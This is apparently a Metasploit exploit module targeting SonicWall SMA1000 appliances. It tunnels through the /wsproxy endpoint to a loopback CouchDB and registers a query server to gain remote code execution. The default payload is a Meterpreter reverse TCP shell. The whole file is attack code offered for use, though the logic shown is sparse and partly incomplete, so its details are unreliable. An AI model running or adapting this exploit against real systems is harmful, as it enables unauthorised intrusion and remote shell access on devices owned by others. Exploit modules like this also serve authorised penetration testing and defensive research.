##
# This module requires Metasploit: https://metasploit.com/download
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'SonicWall SMA1000 CouchDB RCE',
      'Platform' => 'linux',
      'DefaultOptions' => {'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'}))
    register_options([Opt::RPORT(443)])
  end
  def exploit
    # tunnel via /wsproxy?bmID=17&port=5984 to loopback CouchDB
    send_request_cgi('uri' => '/wsproxy/?bmID=17&port=5984', 'method' => 'GET')
    send_request_cgi('uri' => '/_config/query_servers/msf', 'method' => 'PUT', 'data' => '"/usr/bin/node"')
    generate_cmdstager
  end
end
